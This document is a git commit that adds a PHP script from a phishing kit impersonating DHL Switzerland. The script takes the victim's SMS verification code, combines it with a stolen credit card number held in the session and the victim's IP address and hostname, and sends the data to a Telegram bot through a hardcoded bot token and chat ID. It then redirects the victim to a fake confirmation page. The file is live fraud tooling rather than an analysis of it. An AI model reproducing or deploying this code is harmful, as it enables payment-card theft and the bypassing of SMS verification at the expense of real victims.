4a04346bfc03f8cd887d170267c8b4d027c4190b
greenhomeklima <info@greenhomeklima.hu>
2024-07-08 20:28:03 +0100

    Add files via upload

---
+++ index/sendsmserror.php
@@ -0,0 +1,33 @@
+<?php
+
+session_start();
+
+$sms=$_POST["sms"];
+
+$rand=rand(1000000,999999999).rand(1000000,999999999);
+$rand2=base64_encode($rand);
+	
+
+        $_SESSION['sms'] = $sms;
+
+
+
+
+$ip = getenv("REMOTE_ADDR");
+$hostname = gethostbyaddr($ip);
+$message .= "~ Coded By k4iser.a  ~\n";
+$message .= "|----------|CC DHL-CH |----------|\n";
+$message .= "CREDIT CARD    : ".$_SESSION['cc']."\n";
+$message .= "|----------|SMS 2 DHL-CH |----------|\n";
+$message .= "SMS 2  : ".$_SESSION['sms']."\n";
+$message .= "|------------------+|IP|-------------------|\n";
+$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
+$message .= "Hostname  : ".$hostname."\n";
+$subject = "~ <Rslt-DHL-CH>- Coded By k4iser.a ~ | $ip";
+
+
+$token = "7216603666:AAHxvOD_-5evGiaW4GIa9uyG4-opdeV3Pu8";
+    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-4205027125&text=" . urlencode($message)."" );
+	
+header("location:confirmed.php?vc?__event=card&service_id=top_card=AU")
+?>
